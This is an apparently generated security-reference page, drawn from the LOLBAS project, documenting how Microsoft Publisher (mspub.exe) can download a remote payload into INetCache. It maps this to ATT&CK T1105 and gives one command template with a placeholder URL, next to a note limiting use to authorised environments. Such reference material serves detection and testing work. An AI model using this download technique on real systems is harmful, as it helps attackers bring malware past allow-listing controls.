---
parsed_by: focuslocust
source: commands
type: generated
---
# Mspub Commands

[Home](../../../README.md)

> This page contains security testing commands. Use only in authorised environments.

## Mspub.exe

Tool page: [Mspub.exe](../../tools/windows/mspub.exe.md)

### It will download a remote payload and place it in INetCache.

```text
mspub.exe {REMOTEURL}
```

Description:

Downloads payload from remote server

Related ATT&CK:

- [T1105](../../attack/techniques/T1105-ingress-tool-transfer.md)

Provenance:

| Field | Value |
| --- | --- |
| Source | `lolbas` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/lolbas/yml/OtherMSBinaries/Mspub.yml` |
| Evidence | Command preserved from source parser. |
